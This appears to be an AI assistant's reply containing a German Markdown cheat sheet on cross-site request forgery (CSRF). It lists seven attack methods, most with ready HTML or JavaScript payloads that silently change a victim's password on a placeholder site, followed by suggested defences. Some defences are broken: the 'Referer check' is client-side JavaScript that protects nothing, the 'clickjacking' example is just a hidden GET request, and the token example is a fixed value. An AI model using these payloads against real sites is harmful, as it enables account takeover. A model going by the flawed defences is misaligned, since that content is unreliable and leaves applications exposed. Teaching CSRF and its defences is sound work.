Hier ist der Inhalt für deine CSRF-Cheat-Sheet-Datei in Markdown-Format (`csrf-cheatsheet.md`):

```markdown
# CSRF (Cross-Site Request Forgery) Cheat Sheet

## Übersicht

Cross-Site Request Forgery (CSRF) ist ein Angriff, bei dem ein Angreifer einen authentifizierten Benutzer dazu bringt, eine nicht autorisierte Aktion auf einer Webanwendung auszuführen, bei der er angemeldet ist. Diese Cheat-Sheet bietet eine Zusammenfassung der verschiedenen CSRF-Angriffsmethoden und mögliche Schutzmaßnahmen.

## Methoden des CSRF-Angriffs

### 1. **GET-basierte CSRF-Angriffe**
- **Beschreibung**: Aktionen werden über GET-Anfragen ausgeführt. Der Angreifer nutzt einen schädlichen Link, den das Opfer anklickt.
- **Beispiel**:
  ```html
  <img src="https://zielseite.com/änderung?passwort=neuesPasswort" alt="Schädliches Bild">
  ```

### 2. **POST-basierte CSRF-Angriffe**
- **Beschreibung**: Angriffe, die POST-Anfragen nutzen. Ein verstecktes Formular wird automatisch gesendet.
- **Beispiel**:
  ```html
  <form action="https://zielseite.com/änderung" method="POST">
      <input type="hidden" name="passwort" value="neuesPasswort">
  </form>
  <script>
      document.forms[0].submit();
  </script>
  ```

### 3. **CSRF über XMLHttpRequest (AJAX)**
- **Beschreibung**: Angriffe unter Verwendung von JavaScript, um schädliche XMLHttpRequests zu senden.
- **Beispiel**:
  ```javascript
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://zielseite.com/änderung", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("passwort=neuesPasswort");
  ```

### 4. **CORS-basierte CSRF-Angriffe**
- **Beschreibung**: Angriffe, die fehlerhafte CORS-Konfigurationen ausnutzen, um schädliche Anfragen zu senden.
- **Beispiel**:
  ```javascript
  fetch('https://zielseite.com/änderung', {
      method: 'POST',
      credentials: 'include',
      headers: {
          'Content-Type': 'application/json'
      },
      body: JSON.stringify({ passwort: 'neuesPasswort' })
  });
  ```

### 5. **JSON CSRF**
- **Beschreibung**: Angriffe über JSON-Payloads, wenn die Anwendung keine Schutzmechanismen gegen CSRF implementiert.
- **Beispiel**:
  ```javascript
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://zielseite.com/api/änderung", true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify({ passwort: 'neuesPasswort' }));
  ```

### 6. **CSRF über Social Engineering**
- **Beschreibung**: Der Angreifer verwendet Social Engineering, um das Opfer dazu zu bringen, eine schädliche Aktion auszuführen.
- **Beispiel**:
  - Ein bösartiger Link wird dem Opfer über eine gefälschte E-Mail oder eine Nachricht gesendet.

### 7. **Clickjacking-basierte CSRF**
- **Beschreibung**: Der Angreifer nutzt einen unsichtbaren Frame, um das Opfer dazu zu bringen, auf eine Schaltfläche zu klicken, die eine Aktion auslöst.
- **Beispiel**:
  ```html
  <iframe src="https://zielseite.com/änderung?passwort=neuesPasswort" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;" ></iframe>
  ```

## Schutzmaßnahmen gegen CSRF

- **Verwendung von CSRF-Tokens**:
  - Jedes Formular sollte ein eindeutiges CSRF-Token enthalten, das der Server validiert.
  - Beispiel:
    ```html
    <input type="hidden" name="csrf_token" value="abcdef1234567890">
    ```

- **Überprüfung des Referer-Headers**:
  - Überprüfen, ob die Anfrage von der eigenen Domain stammt.
  - Beispiel:
    ```javascript
    if (document.referrer !== 'https://eigene-seite.com') {
        alert('Ungültiger Referer');
    }
    ```

- **SameSite-Cookies**:
  - Verwenden Sie das `SameSite`-Attribut in Cookies, um sie nur für die eigene Domain zu senden.
  - Beispiel:
    ```http
    Set-Cookie: SessionId=abc123; SameSite=Strict; Secure; HttpOnly
    ```

- **Vermeidung von GET-Anfragen für sensible Aktionen**:
  - Sensible Aktionen sollten niemals über GET-Anfragen ausgeführt werden.

- **Verwendung von CAPTCHA**:
  - Ein CAPTCHA kann als zusätzliche Hürde implementiert werden, um sicherzustellen, dass die Anfrage von einem Menschen ausgeführt wird.

## Fazit

CSRF ist eine gefährliche Angriffsmethode, die jedoch durch entsprechende Schutzmaßnahmen effektiv verhindert werden kann. Es ist wichtig, diese Methoden in der Entwicklung von Webanwendungen zu berücksichtigen, um die Sicherheit der Benutzer zu gewährleisten.
